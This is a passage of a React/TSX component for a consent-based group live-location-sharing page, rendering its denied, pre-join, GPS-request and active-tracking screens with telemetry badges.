        {state === "denied" && (
          <motion.div key="denied" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center gap-4 text-center text-white max-w-sm">
            <div className="w-16 h-16 rounded-full bg-amber-500/20 flex items-center justify-center"><MapPin className="w-8 h-8 text-amber-400" /></div>
            <h2 className="text-xl font-bold">Location access needed</h2>
            <p className="text-sm text-white/60">Please enable location access in your browser settings and reload this page.</p>
          </motion.div>
        )}

        {/* ── Pre-join screen ── */}
        {(state === "pre_join" || state === "joining") && groupInfo && (
          <motion.div key="pre_join" initial={{ opacity: 0, y: 24 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -16 }} transition={{ duration: 0.5, ease: "easeOut" }} className="relative z-10 w-full max-w-sm flex flex-col items-center gap-6 text-white text-center">
            <motion.div className="w-20 h-20 rounded-2xl bg-indigo-500/20 border border-indigo-500/30 flex items-center justify-center shadow-2xl shadow-indigo-500/20" animate={{ y: [0, -6, 0] }} transition={{ duration: 3, repeat: Infinity, ease: "easeInOut" }}>
              <Users className="w-10 h-10 text-indigo-400" />
            </motion.div>
            <div>
              <p className="text-xs font-semibold tracking-widest text-indigo-400/80 uppercase mb-1">Group Share</p>
              <h1 className="text-2xl font-bold tracking-tight">{groupInfo.name}</h1>
              <p className="text-sm text-white/50 mt-1"><span className="text-white/70 font-medium">{groupInfo.ownerName}</span> invited you to share your live location</p>
            </div>
            <div className="w-full">
              <label className="block text-xs font-medium text-white/50 mb-1.5 text-left">Your name <span className="text-white/30">(optional)</span></label>
              <input type="text" placeholder="e.g. Alex" value={displayName} onChange={(e) => setDisplayName(e.target.value)} maxLength={60} disabled={state === "joining"} className="w-full px-4 py-3 rounded-xl bg-white/10 border border-white/15 text-white placeholder:text-white/30 focus:outline-none focus:border-indigo-500/60 focus:bg-white/15 transition-all text-sm" />
            </div>
            <div className="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10 text-left">
              <p className="text-xs text-white/50 leading-relaxed">📍 Your live location will be shared with <strong className="text-white/70">{groupInfo.ownerName}</strong> and group participants. It will also appear on their live tracking map.</p>
            </div>
            <motion.button onClick={handleJoin} disabled={state === "joining"} whileTap={{ scale: 0.97 }} className="w-full py-4 rounded-xl bg-indigo-600 hover:bg-indigo-500 disabled:opacity-60 disabled:cursor-not-allowed transition-all font-semibold text-white shadow-xl shadow-indigo-600/30 flex items-center justify-center gap-2">
              {state === "joining" ? <><Loader2 className="w-4 h-4 animate-spin" /> Joining…</> : <><Navigation className="w-4 h-4" /> Join & Share Location</>}
            </motion.button>
          </motion.div>
        )}

        {/* ── Requesting GPS ── */}
        {state === "requesting" && (
          <motion.div key="requesting" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} className="flex flex-col items-center gap-6 text-white text-center max-w-sm">
            <Loader2 className="w-12 h-12 text-indigo-400 animate-spin" />
            <div>
              <h2 className="text-xl font-bold mb-2">Requesting location…</h2>
              <p className="text-sm text-white/50">Please allow location access when prompted</p>
            </div>
          </motion.div>
        )}

        {/* ── Tracking active ── */}
        {state === "tracking" && groupInfo && (
          <motion.div key="tracking" initial={{ opacity: 0, y: 16 }} animate={{ opacity: 1, y: 0 }} className="relative z-10 w-full max-w-sm flex flex-col items-center gap-6 text-white text-center">
            <PulseRing />
            <div>
              <motion.div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/20 border border-emerald-500/30 text-emerald-400 text-xs font-semibold mb-3" animate={{ opacity: [0.7, 1, 0.7] }} transition={{ duration: 2, repeat: Infinity }}>
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                Live — sharing now
              </motion.div>
              <h2 className="text-xl font-bold">{groupInfo.name}</h2>
              {displayName && <p className="text-sm text-white/50 mt-0.5">Sharing as <span className="text-white/70 font-medium">{displayName}</span></p>}
            </div>

            {/* Stats grid */}
            <div className="w-full grid grid-cols-2 gap-3">
              <div className="px-4 py-3 rounded-xl bg-white/5 border border-white/10">
                <p className="text-2xl font-bold text-indigo-400">{updateCount}</p>
                <p className="text-xs text-white/40 mt-0.5">Updates sent</p>
              </div>
              <div className="px-4 py-3 rounded-xl bg-white/5 border border-white/10">
                <p className="text-sm font-semibold text-white/80 truncate">{coords ? `${coords.lat.toFixed(4)}, ${coords.lng.toFixed(4)}` : "—"}</p>
                <p className="text-xs text-white/40 mt-0.5">Current position</p>
              </div>
            </div>

            {/* Telemetry badges */}
            <div className="flex items-center justify-center gap-2 flex-wrap">
              {batteryLevel !== null && (
                <span className={`flex items-center gap-1 text-[11px] font-mono font-semibold px-2 py-0.5 rounded-full border ${batteryLevel < 20 ? "text-red-400 border-red-400/30 bg-red-400/10" : "text-white/60 border-white/20 bg-white/5"}`}>
                  {batteryCharging ? <BatteryCharging className="w-3 h-3" /> : <Battery className="w-3 h-3" />}
                  {batteryLevel}%
                </span>
              )}
              <span className="text-[11px] font-semibold px-2 py-0.5 rounded-full border" style={{ color: ACTIVITY_INFO[activityType].color, borderColor: `${ACTIVITY_INFO[activityType].color}40`, background: `${ACTIVITY_INFO[activityType].color}12` }}>
                {ACTIVITY_INFO[activityType].icon} {ACTIVITY_INFO[activityType].label}
              </span>
            </div>

            {address && <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-xs text-white/40 px-2 line-clamp-2">📍 {address}</motion.p>}

            <div className="w-full px-4 py-3 rounded-xl bg-white/5 border border-white/10">
              <p className="text-xs text-white/40 flex items-center gap-1.5">
                <CheckCircle className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
                Location shared with <strong className="text-white/60">{groupInfo.ownerName}</strong> and visible on their live map
              </p>
            </div>
            <p className="text-xs text-white/25">Keep this page open to continue sharing</p>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
